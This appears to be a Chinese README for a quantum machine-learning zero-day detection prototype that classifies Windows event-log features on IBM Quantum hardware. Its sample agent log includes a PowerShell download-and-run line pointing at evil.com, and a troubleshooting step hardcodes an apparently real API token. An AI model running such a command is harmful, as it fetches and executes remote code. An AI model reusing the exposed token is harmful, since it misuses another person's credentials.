# IBM Quantum 測試與零日攻擊偵測指南

**版本**: v3.4.0  
**最後更新**: 2025-10-15

---

## 🎯 概述

本目錄包含完整的量子機器學習零日攻擊偵測系統，整合 IBM Quantum 真實硬體。

### 核心功能模組

| 腳本 | 用途 | 需要網路 | 難度 |
|------|------|---------|------|
| `feature_extractor.py` | 從 Windows Log 提取特徵 | ❌ 否 | ⭐⭐ 中等 |
| `train_quantum_classifier.py` | 訓練量子分類器 | ❌ 否 | ⭐⭐⭐ 進階 |
| `generate_dynamic_qasm.py` | 動態生成 QASM 電路 | ❌ 否 | ⭐⭐ 中等 |
| `daily_quantum_job.py` | 每日自動化量子作業 | ✅ 是 | ⭐⭐⭐ 進階 |
| `analyze_results.py` | 分析量子分類結果 | ❌ 否 | ⭐⭐ 中等 |
| `auto_upload_qasm.py` | 批次上傳 QASM | ✅ 是 | ⭐⭐ 中等 |
| `check_job_status.py` | 檢查作業狀態 | ✅ 是 | ⭐ 簡單 |
| `schedule_daily_job.ps1` | Windows 排程設定 | ❌ 否 | ⭐ 簡單 |

### 測試腳本（保留用於驗證）

| 腳本 | 用途 | 需要網路 | 難度 |
|------|------|---------|------|
| `simple_qasm_test.py` | 生成測試 QASM 文件 | ❌ 否 | ⭐ 簡單 |
| `test_ibm_connection.py` | 測試 IBM Quantum 連接 | ✅ 是 | ⭐⭐ 中等 |
| `test_real_quantum_job.py` | 提交測試作業 | ✅ 是 | ⭐⭐⭐ 進階 |

---

## 🚀 完整工作流程：零日攻擊偵測系統

### 系統架構圖

```
Windows Agent → FastAPI (main.py) → Feature Extractor → Quantum Classifier
     ↓              ↓                      ↓                     ↓
  Event Logs    /api/v1/agent/log    特徵向量 [0-1]      QASM 電路生成
                                          ↓                     ↓
                                    儲存至 JSON         IBM Quantum 執行
                                          ↓                     ↓
                                   Daily Job (00:00)      測量結果
                                          ↓                     ↓
                                    載入訓練模型          Result Analysis
                                          ↓                     ↓
                                    生成預測電路    Zero-Day / Known Attack
```

### 工作流程步驟

#### 階段 1: 環境準備與依賴安裝

```powershell
# 1. 切換到量子模組目錄
cd Experimental/cyber-ai-quantum

# 2. 安裝依賴套件
pip install -r requirements.txt

# 3. 設定 IBM Quantum Token
$env:IBM_QUANTUM_TOKEN="your_ibm_quantum_token_here"

# 或建立 .env 檔案
echo 'IBM_QUANTUM_TOKEN=your_token_here' > .env
```

#### 階段 2: 訓練量子分類器（首次執行）

```powershell
# 訓練量子神經網路模型
python train_quantum_classifier.py

# 可選參數:
# --samples 100      # 訓練樣本數
# --iterations 100   # 優化器迭代次數
# --simple          # 使用簡化訓練模式（不需 qiskit-machine-learning）
```

**輸出**: `quantum_classifier_model.json` (包含訓練好的權重參數)

**預期結果**:
```
[OK] 訓練集準確率: 85.00%
[OK] 測試集準確率: 80.00%
[SUCCESS] 訓練好的模型參數已儲存至: quantum_classifier_model.json
```

#### 階段 3: 測試特徵提取器

```powershell
# 測試 Windows Log 特徵提取
python feature_extractor.py
```

**功能**: 從範例 Windows Event Log 提取 6 個標準化特徵:
1. 失敗登入頻率
2. 可疑程序分數
3. PowerShell 風險指數
4. 網路異常率
5. 系統檔案修改次數
6. Event Log 清除事件

#### 階段 4: 測試動態 QASM 生成

```powershell
# 使用模擬特徵生成 QASM 電路
python generate_dynamic_qasm.py --qubits 7

# 使用自訂特徵
python generate_dynamic_qasm.py --features "0.2,0.5,0.8,0.1,0.9,0.3" --output test_circuit.qasm

# 使用訓練好的權重
python generate_dynamic_qasm.py --weights "0.785,1.571,0.523,2.094,1.047,0.261"
```

**輸出**: `qasm_output/daily_log_YYYYMMDD_HHMMSS.qasm`

#### 階段 5: 手動執行量子作業（測試）

```powershell
# 執行完整的量子分類流程
python daily_quantum_job.py

# 使用模擬器（快速測試）
$env:USE_SIMULATOR="true"
python daily_quantum_job.py
```

**流程說明**:
1. 載入訓練好的模型
2. 獲取特徵（目前為模擬，TODO: 整合真實 Windows Log）
3. 生成量子電路
4. 連接 IBM Quantum
5. 提交作業並等待結果
6. 自動分析並生成報告

**輸出檔案**:
- `results/job_<job_id>_info.txt` - 作業資訊
- `results/result_<job_id>.json` - 測量結果
- `results/analysis_<job_id>.json` - 分析報告

#### 階段 6: 分析量子分類結果

```powershell
# 分析指定作業的結果
python analyze_results.py results/result_<job_id>.json

# 自訂閾值
python analyze_results.py results/result_<job_id>.json --threshold 0.6

# 儲存分析報告
python analyze_results.py results/result_<job_id>.json --save
```

**輸出範例**:
```
📊 零日攻擊分類分析報告
======================================================================
Job ID: d3n21f1fk6qs73e8fo3g
Backend: ibm_torino
總測量次數 (Shots): 2048

詳細測量結果分析:
  [🔴 HIGH] Bitstring: '1' → qubit[0]='1' → Zero-Day Attack (Potential)  | 次數: 1100
  [🟢 LOW ] Bitstring: '0' → qubit[0]='0' → Known Attack / Benign        | 次數: 948

統計摘要:
  - P(|1⟩) 機率 (判定為 Zero-Day): 53.71%
  - P(|0⟩) 機率 (判定為 Known Attack): 46.29%

最終推論:
  [🔴 CRITICAL] 高度可能為 Zero-Day Attack
```

#### 階段 7: 設定每日自動化排程

```powershell
# 以管理員身分執行排程設定腳本
.\schedule_daily_job.ps1

# 自訂參數
.\schedule_daily_job.ps1 -ExecutionTime "00:00" -TaskName "PandoraQuantumDailyJob"
```

**功能**:
- 在 Windows 工作排程器建立任務
- 每日 00:00 (TPE 時區) 自動執行
- 自動記錄日誌到 `logs/daily_job.log`
- 可手動測試執行

**管理指令**:
```powershell
# 查看任務狀態
Get-ScheduledTask -TaskName "PandoraQuantumDailyJob"

# 手動執行一次
Start-ScheduledTask -TaskName "PandoraQuantumDailyJob"

# 停用任務
Disable-ScheduledTask -TaskName "PandoraQuantumDailyJob"

# 查看日誌
Get-Content logs/daily_job.log -Tail 50
```

#### 階段 8: 整合 Windows Agent（實作中）

```powershell
# 啟動 FastAPI 服務
uvicorn main:app --host 0.0.0.0 --port 8000

# Windows Agent 發送日誌 (使用 curl 或 PowerShell)
$logData = @{
    agent_id = "AGENT001"
    hostname = "WIN-SERVER-01"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    logs = @(
        @{event_id = 4625; user = "admin"; source_ip = "192.168.1.100"},
        @{event_id = 4104; script_block = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"}
    )
}

Invoke-RestMethod -Uri "http://localhost:8000/api/v1/agent/log" `
    -Method POST `
    -ContentType "application/json" `
    -Body ($logData | ConvertTo-Json -Depth 10)
```

**API 回應**:
```json
{
  "status": "success",
  "message": "已接收 2 筆日誌",
  "agent_id": "AGENT001",
  "hostname": "WIN-SERVER-01",
  "features": [0.02, 0.0, 0.1, 0.0, 0.0, 0.0],
  "risk_assessment": {
    "score": 0.02,
    "level": "LOW",
    "recommendation": "持續監控"
  }
}
```

---

## 🧪 測試與驗證

### 測試 1: 生成 QASM（離線）

**最簡單的測試，不需要 IBM 帳號**

```bash
cd Experimental/cyber-ai-quantum
python simple_qasm_test.py
```

**輸出**:
- `qasm_output/bell_state.qasm` - Bell State 電路
- `qasm_output/superposition.qasm` - 疊加態電路
- `qasm_output/phase_kickback.qasm` - 相位反衝電路
- `qasm_output/bell_state_v3.qasm` - OpenQASM 3.0 版本

**成功標誌**:
```
[SUCCESS] All QASM files generated!
```

---

### 測試 2: 連接到 IBM Quantum

**測試 API Token 和網路連接**

```bash
# 設置 Token
$env:IBM_QUANTUM_TOKEN="7PzS0AdaFB83OVn7WghkdLupzthCe1fTl3yI4Qrp7G6o"

# 運行測試
python test_ibm_connection.py
```

**成功標誌**:
```
[SUCCESS] Connected via ibm_cloud channel!
[OK] Found 2 backends
  - ibm_brisbane (127 qubits)
  - ibm_torino (133 qubits)
```

**如果失敗**:
- 檢查網路連接
- 驗證 Token 是否有效
- 查看 `docs/WINDOWS-FIXES.md`

---

### 測試 3: 提交真實量子作業

**提交電路到真實量子硬體執行**

```bash
python test_real_quantum_job.py
```

**流程**:
1. 連接到 IBM Quantum
2. 選擇最不忙碌的後端
3. 創建 Bell State 電路
4. 轉譯並優化電路
5. 提交作業
6. 等待結果（1-30 分鐘）

**成功標誌**:
```
[SUCCESS] Job ID: <job_id>
[INFO] Backend: ibm_brisbane
[INFO] Status: QUEUED
```

---

## 📋 生成的 QASM 示例

### Bell State (量子糾纏)

```qasm
OPENQASM 2.0;
include "qelib1.inc";
qreg q[2];
creg c[2];
h q[0];
cx q[0],q[1];
measure q[0] -> c[0];
measure q[1] -> c[1];
```

**物理意義**:
- 創建 |Φ+⟩ = (|00⟩ + |11⟩)/√2
- 測量結果: 50% |00⟩, 50% |11⟩
- 證明量子糾纏存在

---

### Superposition (疊加態)

```qasm
OPENQASM 2.0;
include "qelib1.inc";
qreg q[3];
creg c[3];
h q[0];
h q[1];
h q[2];
measure q[0] -> c[0];
measure q[1] -> c[1];
measure q[2] -> c[2];
```

**物理意義**:
- 創建均勻疊加態
- 測量結果: 8 種狀態各 12.5%
- 證明量子疊加原理

---

### Phase Kickback (相位反衝)

```qasm
OPENQASM 2.0;
include "qelib1.inc";
qreg q[2];
creg c[2];
h q[0];
x q[1];
h q[1];
cz q[0],q[1];
h q[0];
h q[1];
measure q[0] -> c[0];
measure q[1] -> c[1];
```

**物理意義**:
- 演示相位反衝效應
- 用於量子算法（如 Grover）
- 證明量子相位操作

---

## 🔬 手動上傳到 IBM Quantum

### 方法 1: 使用 IBM Quantum Composer（Web UI）

1. **訪問**: https://quantum.ibm.com/composer
2. **登入**: 使用您的 IBM Quantum 帳號
3. **創建新電路**:
   - 點擊 "New circuit"
   - 選擇 "Code" 模式
4. **貼上 QASM**:
   - 複製 `qasm_output/bell_state.qasm` 內容
   - 貼到編輯器
5. **選擇後端**:
   - Simulator: `ibmq_qasm_simulator` (免費，即時)
   - Real: `ibm_brisbane` (127 qubits，需排隊)
6. **執行**:
   - 點擊 "Run"
   - 設置 shots: 1024
   - 提交作業

### 方法 2: 使用 Python API（自動化）

```python
from qiskit import QuantumCircuit
from qiskit_ibm_runtime import QiskitRuntimeService, SamplerV2

# 連接
service = QiskitRuntimeService(channel='ibm_cloud', token='your_token')

# 載入 QASM
with open('qasm_output/bell_state.qasm', 'r') as f:
    qasm_code = f.read()

qc = QuantumCircuit.from_qasm_str(qasm_code)

# 選擇後端
backend = service.backend('ibm_brisbane')

# 提交
sampler = Sampler(backend)
job = sampler.run([qc], shots=1024)

print(f"Job ID: {job.job_id()}")
```

---

## 🐛 故障排除

### 問題 1: 連接失敗

**錯誤**: `HTTPSConnectionPool Max retries exceeded`

**解決方案**:
```python
# 方法 1: 使用 ibm_cloud channel
service = QiskitRuntimeService(channel='ibm_cloud', token=token)

# 方法 2: 使用 ibm_quantum channel
service = QiskitRuntimeService(channel='ibm_quantum', token=token)

# 方法 3: 保存憑證
QiskitRuntimeService.save_account(channel='ibm_cloud', token=token, overwrite=True)
service = QiskitRuntimeService()
```

### 問題 2: Token 無效

**錯誤**: `401 Unauthorized`

**解決方案**:
1. 訪問 https://quantum.ibm.com/account
2. 複製新的 API Token
3. 更新環境變數:
   ```bash
   $env:IBM_QUANTUM_TOKEN="new_token_here"
   ```

### 問題 3: 作業卡在 QUEUED

**原因**: 真實量子硬體排隊中

**解決方案**:
```python
# 使用模擬器（即時結果）
backend = service.backend('ibmq_qasm_simulator')

# 或選擇較不忙碌的後端
backend = service.least_busy(operational=True, simulator=False)
```

---

## 📊 預期結果

### Bell State 測量結果

**理想情況**（無噪聲）:
```
|00>: 512 (50.0%) ##########################
|11>: 512 (50.0%) ##########################
|01>:   0 ( 0.0%)
|10>:   0 ( 0.0%)
```

**真實硬體**（有噪聲）:
```
|00>: 480 (46.9%) #######################
|11>: 490 (47.9%) ########################
|01>:  28 ( 2.7%) #
|10>:  26 ( 2.5%) #
```

**分析**:
- 糾纏比例 > 85%: 優秀 ✅
- 糾纏比例 70-85%: 良好 ⚠️
- 糾纏比例 < 70%: 噪聲過高 ❌

---

## 🎯 下一步

### 1. 驗證 QASM 生成
```bash
python simple_qasm_test.py
ls qasm_output/
```

### 2. 測試 IBM 連接
```bash
python test_ibm_connection.py
```

### 3. 提交真實作業（可選）
```bash
python test_real_quantum_job.py
```

### 4. 檢查作業狀態
```bash
python check_job_status.py <job_id>
```

---

## 📚 相關文檔

- **IBM Quantum 設置**: `docs/IBM-QUANTUM-SETUP.md`
- **Qiskit 整合**: `docs/QISKIT-INTEGRATION-GUIDE.md`
- **Windows 修復**: `docs/WINDOWS-FIXES.md`
- **Zero Trust 規格**: `ML+Quantum Zero Trust Attack Prediction-Spec.md`

---

## ✅ 成功案例

```
[2025-01-14 18:00:13] 
✅ QASM 文件生成成功
✅ IBM Quantum 連接成功 (ibm_cloud channel)
✅ 找到 2 個真實量子後端
   - ibm_brisbane (127 qubits)
   - ibm_torino (133 qubits)
✅ 4 個 QASM 文件已保存
```

---

## 🎓 進階主題

### 量子機器學習原理

本系統使用 **Variational Quantum Classifier (VQC)** 架構：

1. **特徵編碼層**: 使用 RX 旋轉門將古典特徵映射到量子態
2. **糾纏層**: CNOT 門創建量子位元間的關聯
3. **變分層**: 可訓練的 CRY 門學習最佳決策參數
4. **測量層**: 測量 qubit[0] 得到分類結果

### 模型訓練細節

- **優化器**: COBYLA (對噪聲不敏感)
- **損失函數**: 交叉熵 (Cross-Entropy)
- **訓練數據**: 模擬的已知攻擊 vs 零日攻擊特徵
- **評估指標**: 訓練集準確率、測試集準確率

### 真實量子硬體 vs 模擬器

| 特性 | 模擬器 | 真實硬體 |
|------|-------|---------|
| 執行速度 | 即時 | 數分鐘到數小時 |
| 噪聲 | 無 | 有（需要錯誤緩解） |
| 精確度 | 100% | 85-95% |
| 費用 | 免費 | 消耗配額 |
| 用途 | 開發測試 | 生產環境 |

### 效能優化建議

1. **使用轉譯優化**: `optimization_level=3`
2. **錯誤緩解技術**: T-REx, ZNE
3. **選擇低噪聲後端**: 檢查 `backend.properties()`
4. **增加 shots 數**: 2048+ 以獲得更穩定的結果
5. **批次提交**: 一次提交多個電路節省排隊時間

---

## 📋 TODO 與後續開發

### 高優先級
- [ ] 整合真實 Windows Agent 日誌數據
- [ ] 實作自動重新訓練機制
- [ ] 建立 Dashboard 視覺化界面
- [ ] 實作告警通知系統（Email/Slack）

### 中優先級
- [ ] 支援多分類（DDoS、XSS、SQLi、Unknown）
- [ ] 特徵重要性分析 (XAI)
- [ ] 模型版本管理系統
- [ ] 結合傳統 ML 模型的混合系統

### 低優先級
- [ ] 支援其他量子後端（IonQ、Rigetti）
- [ ] 實作量子錯誤緩解
- [ ] 探索更複雜的量子電路架構
- [ ] 建立 A/B Testing 框架

---

## 📚 相關文檔

- **完整規格**: `Experimental/new_spec.md`
- **IBM Quantum 設置**: `docs/IBM-QUANTUM-SETUP.md`
- **Qiskit 整合**: `docs/QISKIT-INTEGRATION-GUIDE.md`
- **Windows 修復**: `docs/WINDOWS-FIXES.md`
- **Zero Trust 規格**: `ML+Quantum Zero Trust Attack Prediction-Spec.md`

---

## 🔧 故障排除補充

### 問題 4: qiskit-machine-learning 安裝失敗

**錯誤**: `No matching distribution found`

**解決方案**:
```powershell
# 使用簡化訓練模式
python train_quantum_classifier.py --simple

# 或手動安裝
pip install qiskit-machine-learning==0.7.2
```

### 問題 5: 日誌目錄權限錯誤

**錯誤**: `PermissionError: [WinError 5] Access is denied`

**解決方案**:
```powershell
# 手動建立目錄並設定權限
New-Item -ItemType Directory -Path "logs" -Force
New-Item -ItemType Directory -Path "results" -Force
New-Item -ItemType Directory -Path "data/windows_logs" -Force
```

### 問題 6: 排程任務無法執行

**檢查清單**:
1. 確認 Python 路徑正確: `where python`
2. 檢查任務狀態: `Get-ScheduledTask -TaskName "PandoraQuantumDailyJob"`
3. 查看任務歷史: 開啟工作排程器 → 任務歷程記錄
4. 檢查日誌檔案: `Get-Content logs/daily_job.log`

---

## ✅ 成功案例

### v3.4.0 更新 (2025-10-15)
```
✅ 完整實作零日攻擊偵測系統
✅ 整合量子機器學習訓練流程
✅ 動態 QASM 電路生成器
✅ 自動化每日量子作業
✅ Windows Agent API 端點
✅ 特徵提取器模組
✅ 結果分析與報告生成
✅ Windows 排程腳本
✅ 修復 Qiskit Runtime V2 API 相容性
```

### v3.3.2 (2025-01-14)
```
✅ QASM 文件生成成功
✅ IBM Quantum 連接成功 (ibm_cloud channel)
✅ 找到 2 個真實量子後端
   - ibm_brisbane (127 qubits)
   - ibm_torino (133 qubits)
✅ 4 個 QASM 文件已保存
```

---

**維護者**: Pandora Security Team  
**版本**: v3.4.0  
**支援**: support@pandora-ids.com  
**最後更新**: 2025-10-15

